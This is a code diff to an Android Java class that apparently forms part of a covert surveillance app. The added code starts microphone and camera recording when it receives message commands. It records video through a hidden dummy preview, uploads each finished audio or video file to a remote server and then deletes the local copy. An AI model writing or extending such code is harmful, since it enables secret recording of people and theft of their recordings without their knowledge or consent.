@@ -3,13 +3,26 @@ package com.fs.fs.api;
 import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.media.MediaRecorder;
+import android.os.Handler;
+import android.os.Message;
+import android.text.TextUtils;
 
 import com.fs.fs.App;
+import com.fs.fs.api.network.ApiConfig;
+import com.fs.fs.api.network.core.BaseResponse;
+import com.fs.fs.api.network.core.HttpParams;
+import com.fs.fs.api.network.core.OkHttpUtils;
+import com.fs.fs.api.network.core.callback.HttpCallback;
 import com.fs.fs.utils.DateUtils;
 import com.fs.fs.utils.FileUtils;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.Date;
+
+import okhttp3.Headers;
+
+import static com.fs.fs.api.CameraService.getCameraId_low;
 
 /**
  * Created by wyx on 2017/1/4.
@@ -18,13 +31,20 @@ import java.util.Date;
  */
 
 public class MediaRecordService {
-    private MediaRecorder mMediaRecorder;
+    private MediaRecorder mMediaRecorder = null;
     private Camera mCamera = null;
     private String path = null;
     private Boolean isStart = false;
+    private static MyHandler sHandler = null;
+
+    public static final int START_AUDIO = 1;
+    public static final int STOP_AUDIO = 2;
+    public static final int START_VIDEO = 3;
+    public static final int STOP_VIDEO = 4;
 
 
     private MediaRecordService() {
+        sHandler = new MyHandler();
     }
 
     private static class SingletonHolder {
@@ -37,7 +57,7 @@ public class MediaRecordService {
 
 
     public void startRecordAudio() {
-        stopRecord();
+        stopRecordAudio();
         mMediaRecorder = new MediaRecorder();
         mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
         mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
@@ -54,21 +74,21 @@ public class MediaRecordService {
             mMediaRecorder.prepare();
         } catch (IOException e) {
             e.printStackTrace();
-            stopRecord();
+            stopRecordAudio();
         }
         mMediaRecorder.start();
     }
 
-    public void startRecordVideo() {
-        stopRecord();
+    public void startRecordVideo(Integer cameraId) {
+        cameraId = cameraId == null ? getCameraId_low() : cameraId;
+        stopRecordVideo();
         try {
             /**
              TODO:WTF!!! record video will have a sound when MediaRecorder start or stop.
              But record audio no
              TODO:Use ffmpeg replace MediaRecorder
              **/
-            //TODO:可以选镜头
-            mCamera = Camera.open(CameraService.getCameraId_low());
+            mCamera = Camera.open(cameraId);
             mCamera.setPreviewTexture(new SurfaceTexture(10));
             mMediaRecorder = new MediaRecorder();
             mCamera.unlock();
@@ -98,32 +118,49 @@ public class MediaRecordService {
             isStart = true;
         } catch (Exception e) {
             e.printStackTrace();
-            stopRecord();
+            stopRecordVideo();
         }
     }
 
 
-    public void restartRecordAudio() {
-        stop();
-        startRecordAudio();
-    }
-
-    public void stopRecord() {
+    public void stopRecordVideo() {
         releaseMediaRecorder();
         releaseCamera();
+        if (isStart && !TextUtils.isEmpty(path)) {
+            final File file = new File(path);
+            OkHttpUtils.postAsync(ApiConfig.getVideo(), new HttpParams().addFile("video", file), new HttpCallback(BaseResponse.class) {
+                @Override
+                public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                    FileUtils.delete(file);
+                }
+
+                @Override
+                public void onError(String errorMsg) {
+
+                }
+            });
+            isStart = false;
+            path = null;
+        }
     }
 
-    private void stop() {
-        if (mMediaRecorder != null) {
-            try {
-                if (isStart) mMediaRecorder.stop();
-                mMediaRecorder.reset();
-                //TODO:删除
-            } catch (Exception e) {
-                e.printStackTrace();
-            } finally {
-                mMediaRecorder = null;
-            }
+    public void stopRecordAudio() {
+        releaseMediaRecorder();
+        if (isStart && !TextUtils.isEmpty(path)) {
+            final File file = new File(path);
+            OkHttpUtils.postAsync(ApiConfig.getAudio(), new HttpParams().addFile("audio", file), new HttpCallback(BaseResponse.class) {
+                @Override
+                public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                    FileUtils.delete(file);
+                }
+
+                @Override
+                public void onError(String errorMsg) {
+
+                }
+            });
+            isStart = false;
+            path = null;
         }
     }
 
@@ -133,7 +170,6 @@ public class MediaRecordService {
                 if (isStart) mMediaRecorder.stop();
                 mMediaRecorder.reset();
                 mMediaRecorder.release();
-                //TODO:上传删除
             } catch (Exception e) {
                 e.printStackTrace();
             } finally {
@@ -147,6 +183,33 @@ public class MediaRecordService {
             mCamera.lock();
             mCamera.release();
             mCamera = null;
+        }
+    }
+
+    public static void sendMessage(int what) {
+        if (sHandler != null) {
+            sHandler.sendEmptyMessage(what);
+        }
+    }
+
+    private static class MyHandler extends Handler {
+
+        @Override
+        public void handleMessage(Message msg) {
+            switch (msg.what) {
+                case START_AUDIO:
+                    MediaRecordService.getInstance().startRecordAudio();
+                    break;
+                case STOP_AUDIO:
+                    MediaRecordService.getInstance().stopRecordAudio();
+                    break;
+                case START_VIDEO:
+                    MediaRecordService.getInstance().startRecordVideo(null);
+                    break;
+                case STOP_VIDEO:
+                    MediaRecordService.getInstance().stopRecordVideo();
+                    break;
+            }
         }
     }
 
